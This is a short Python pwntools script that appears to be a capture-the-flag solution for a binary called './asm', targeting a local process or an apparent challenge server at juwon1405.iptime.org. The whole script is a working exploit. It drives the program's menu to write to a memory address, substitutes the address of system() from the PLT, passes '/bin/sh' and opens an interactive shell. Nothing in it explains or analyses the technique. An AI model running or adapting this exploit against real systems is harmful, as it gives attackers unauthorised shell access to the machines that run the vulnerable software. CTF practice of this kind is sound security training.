from pwn import *

context.log_level = 'warn'

def command(token, *args) :
    s.recvuntil(token)
    for i in args :
        s.sendline(str(i))
        sleep(0.1)

def solver() :
    fast = lambda token, *args : command(token, *args)
    
    fast(':', 'stitch')
    fast(':', '/bin/sh\x00')

    fast('->', 2)
    #[8] mov qword rdx, 134529052
    fast('->', 8)
    fast(':', 'rdx')
    fast(':', 134529052)

    #[6] mov qword memory, register
    fast('->', 6)
    fast(':', '804C4dc')
    fast(':', 'rdx')

    #[20] Exit..
    fast('->', 20)

    #modified
    fast('->', 3)
    fast(':', p32(elf.plt['system']))
    fast(':', '/bin/sh\x00')

    pause()

    s.interactive()


if __name__ == '__main__' :
    if len(sys.argv) == 1:
        s = process('./asm')
        print util.proc.pidof(s)
        pause()
    else :
        s = remote('juwon1405.iptime.org', 5353)
    elf = ELF('./asm')
    solver()

